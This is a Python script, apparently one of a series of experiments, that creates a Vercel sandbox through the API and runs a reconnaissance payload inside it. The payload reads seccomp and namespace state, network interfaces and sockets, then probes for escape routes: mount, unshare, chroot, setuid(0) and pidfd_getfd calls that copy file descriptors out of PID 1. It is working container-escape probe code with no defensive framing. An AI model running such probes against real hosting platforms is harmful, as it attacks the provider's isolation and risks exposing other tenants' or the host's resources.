# -*- coding: utf-8 -*-
"""实验J280f: Seccomp/ns/网络/系统状态补全"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expj280f"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

def run_cmd_raw(sid, code, label):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": 100}
    t0 = time.time()
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    print(r[:6000], flush=True)

CODE = r'''
import os, subprocess
def sh(cmd, t=6):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace")
    except Exception as e:
        return "ERR %s" % e
print("===== seccomp =====", flush=True)
print(sh("grep Seccomp /proc/1/status; grep Seccomp /proc/self/status"), flush=True)
print("===== ns 对比 =====", flush=True)
print("pid1:", sh("readlink /proc/1/ns/mnt /proc/1/ns/pid /proc/1/ns/net /proc/1/ns/uts /proc/1/ns/user 2>&1"), flush=True)
print("self:", sh("readlink /proc/self/ns/mnt /proc/self/ns/pid /proc/self/ns/net /proc/self/ns/uts /proc/self/ns/user 2>&1"), flush=True)
print("===== 网络接口 =====", flush=True)
print(sh("cat /proc/net/dev 2>&1"), flush=True)
print("===== 路由 =====", flush=True)
print(sh("cat /proc/net/route 2>&1"), flush=True)
print("===== unix sockets =====", flush=True)
print(sh("cat /proc/net/unix 2>&1 | head -20"), flush=True)
print("===== tcp sockets =====", flush=True)
print(sh("cat /proc/net/tcp 2>&1 | head -15"), flush=True)
print("===== PID1 syscall =====", flush=True)
print(sh("cat /proc/1/syscall 2>&1"), flush=True)
print("===== 权限探针 (mount/unshare/chroot) =====", flush=True)
print("mount:", sh("mkdir -p /tmp/m1 && mount -t tmpfs tmpfs /tmp/m1 2>&1"), flush=True)
print("unshare-mount:", sh("unshare -m true 2>&1"), flush=True)
print("unshare-pid:", sh("unshare -p -f true 2>&1"), flush=True)
print("chroot:", sh("mkdir -p /tmp/c1 && chroot /tmp/c1 /bin/true 2>&1"), flush=True)
print("setuid0:", sh("python3 -c \"import os; os.setuid(0); print('ROOT_OK uid=', os.getuid())\" 2>&1"), flush=True)
print("===== pidfd_getfd 复制 fd8 =====", flush=True)
try:
    pidfd = os.pidfd_open(1, 0)
    copied = []
    for i in range(0, 20):
        try:
            nfd = os.pidfd_getfd(pidfd, i, 0)
            copied.append((i, nfd))
        except Exception:
            pass
    print("COPIED:", copied, flush=True)
    for i, nfd in copied:
        try:
            print(i, "->", os.readlink("/proc/self/fd/%d" % nfd), flush=True)
        except Exception:
            pass
    os.close(pidfd)
except Exception as e:
    print("PIDFD_ERR %s: %s" % (type(e).__name__, e), flush=True)
print("DONE", flush=True)
'''
run_cmd_raw(sid, CODE, "RECON2")
